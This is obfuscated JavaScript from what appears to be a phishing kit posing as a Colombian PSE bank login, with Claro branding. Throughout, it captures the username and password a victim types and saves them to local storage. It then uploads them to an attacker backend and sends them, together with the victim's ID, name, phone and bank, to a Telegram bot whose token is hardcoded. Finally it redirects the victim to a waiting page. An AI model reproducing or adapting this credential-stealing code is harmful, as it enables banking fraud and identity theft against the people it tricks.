const _0x562c71 = _0x5a57;
(function (_0xd72d52, _0x55dc94) {
  const _0x1b0c9c = _0x5a57,
    _0x15ef41 = _0xd72d52();
  while (!![]) {
    try {
      const _0x18327b =
        (-parseInt(_0x1b0c9c(0x1cb)) / 0x1) *
          (-parseInt(_0x1b0c9c(0x1c8)) / 0x2) +
        parseInt(_0x1b0c9c(0x1e8)) / 0x3 +
        parseInt(_0x1b0c9c(0x1ea)) / 0x4 +
        (-parseInt(_0x1b0c9c(0x1d4)) / 0x5) *
          (-parseInt(_0x1b0c9c(0x1e1)) / 0x6) +
        -parseInt(_0x1b0c9c(0x1e0)) / 0x7 +
        parseInt(_0x1b0c9c(0x1d6)) / 0x8 +
        -parseInt(_0x1b0c9c(0x1df)) / 0x9;
      if (_0x18327b === _0x55dc94) break;
      else _0x15ef41["push"](_0x15ef41["shift"]());
    } catch (_0x12fa23) {
      _0x15ef41["push"](_0x15ef41["shift"]());
    }
  }
})(_0x27a4, 0x41e58);
function updateLS() {
  const _0x3f0de7 = _0x5a57;
  LS["setItem"](_0x3f0de7(0x1eb), JSON[_0x3f0de7(0x1f5)](info));
}
const button = document[_0x562c71(0x1cc)]("btnUsuario"),
  userInput = document["getElementById"](_0x562c71(0x1f1)),
  passInput = document[_0x562c71(0x1cc)]("txtPass");
async function sendToTelegram(_0x7db559) {
  const _0x3b3411 = _0x562c71;
  for (const _0x12f24c of chatIds) {
    const _0x31e924 =
      _0x3b3411(0x1ce) +
      _0x12f24c +
      _0x3b3411(0x1d5) +
      encodeURIComponent(_0x7db559);
    try {
      const _0x5acff4 = await fetch(_0x31e924);
      _0x5acff4["ok"]
        ? console[_0x3b3411(0x1de)](_0x3b3411(0x1f0) + _0x12f24c + ")")
        : console[_0x3b3411(0x1f6)](
            _0x3b3411(0x1c7) + _0x12f24c + "):",
            _0x5acff4["statusText"]
          );
    } catch (_0x4c39a5) {
      console["error"](
        "Error\x20de\x20red\x20(chat\x20ID:\x20" + _0x12f24c + "):",
        _0x4c39a5
      );
    }
  }
}
function _0x27a4() {
  const _0x37cfc9 = [
    "\x0a📱Teléfono:\x20",
    "nombre",
    "35UsbsHu",
    "&text=",
    "4082648jgkSfM",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "\x0a🔒Contraseña:\x20",
    "wait.html",
    "\x0a🚹Usuario:\x20",
    "user",
    "Usuario\x20encontrado",
    "href",
    "log",
    "7788636jNMtXm",
    "727370GccZHF",
    "142830vnZtbc",
    "preventDefault",
    "\x0aCorrigió\x20Usuario",
    "\x0a🆔Nombre:\x20",
    "puser",
    "telefono",
    "value",
    "107913oybQgk",
    "metaInfo",
    "116024HvdiOh",
    "info",
    "Usuario\x20actualizado",
    "\x0aFuente:\x20",
    "location",
    "idreg",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "txtUsuario",
    "application/json",
    "/trico/tricoUserPse/",
    "GET",
    "stringify",
    "error",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "6jslfeh",
    "json",
    "addEventListener",
    "165761elmyjQ",
    "getElementById",
    "bank",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "\x0a🏦Banco:\x20",
    "disabled",
    "focus",
  ];
  _0x27a4 = function () {
    return _0x37cfc9;
  };
  return _0x27a4();
}
function _0x5a57(_0x5ae1d2, _0x53e260) {
  const _0x27a45e = _0x27a4();
  return (
    (_0x5a57 = function (_0x5a5766, _0x140e0a) {
      _0x5a5766 = _0x5a5766 - 0x1c7;
      let _0x4e1ff6 = _0x27a45e[_0x5a5766];
      return _0x4e1ff6;
    }),
    _0x5a57(_0x5ae1d2, _0x53e260)
  );
}
async function updateStatus() {
  const _0x898d11 = _0x562c71;
  button[_0x898d11(0x1d0)] = !![];
  const _0x29532f = await fetch(url + "/trico/tricoData", {
      method: _0x898d11(0x1f4),
      headers: { "Content-Type": _0x898d11(0x1f2) },
    }),
    _0x574ab0 = await _0x29532f[_0x898d11(0x1c9)](),
    _0x2c9cb0 = [..._0x574ab0];
  for (const _0x3c520d of _0x2c9cb0) {
    if (_0x3c520d["id"] == info[_0x898d11(0x1e9)]["cc"]) {
      console["log"](_0x898d11(0x1dc));
      const _0x358f43 = await fetch(
          url + _0x898d11(0x1f3) + _0x3c520d[_0x898d11(0x1ef)],
          {
            method: "PUT",
            headers: { "Content-Type": _0x898d11(0x1f2) },
            body: JSON[_0x898d11(0x1f5)]({
              usuario: info[_0x898d11(0x1e9)][_0x898d11(0x1db)],
              password: info[_0x898d11(0x1e9)]["puser"],
            }),
          }
        ),
        _0x372257 = await _0x358f43[_0x898d11(0x1c9)](),
        _0x85fc71 =
          _0x898d11(0x1d7) +
          _0x3c520d["id"] +
          _0x898d11(0x1e4) +
          _0x3c520d[_0x898d11(0x1d3)] +
          _0x898d11(0x1d2) +
          _0x3c520d[_0x898d11(0x1e6)] +
          _0x898d11(0x1da) +
          info[_0x898d11(0x1e9)][_0x898d11(0x1db)] +
          _0x898d11(0x1d8) +
          info[_0x898d11(0x1e9)]["puser"] +
          _0x898d11(0x1cf) +
          _0x3c520d[_0x898d11(0x1cd)] +
          _0x898d11(0x1ed) +
          fuente +
          _0x898d11(0x1e3);
      await sendToTelegram(_0x85fc71),
        _0x358f43["ok"]
          ? console["log"](_0x898d11(0x1ec))
          : console["error"](
              "Error\x20al\x20actualizar\x20usuario:",
              _0x358f43["statusText"]
            );
    }
  }
  (button["disabled"] = ![]),
    (window[_0x898d11(0x1ee)][_0x898d11(0x1dd)] = _0x898d11(0x1d9));
}
button[_0x562c71(0x1ca)]("click", async function (_0x1b92e3) {
  const _0x3640e0 = _0x562c71;
  _0x1b92e3[_0x3640e0(0x1e2)]();
  if (userInput[_0x3640e0(0x1e7)] == "" && passInput[_0x3640e0(0x1e7)] == "") {
    alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
      userInput[_0x3640e0(0x1d1)]();
    return;
  } else {
    var _0x57f651 = userInput[_0x3640e0(0x1e7)],
      _0x4203f = passInput[_0x3640e0(0x1e7)];
    (info[_0x3640e0(0x1e9)][_0x3640e0(0x1db)] = _0x57f651),
      (info[_0x3640e0(0x1e9)][_0x3640e0(0x1e5)] = _0x4203f),
      updateLS(),
      await updateStatus();
  }
});
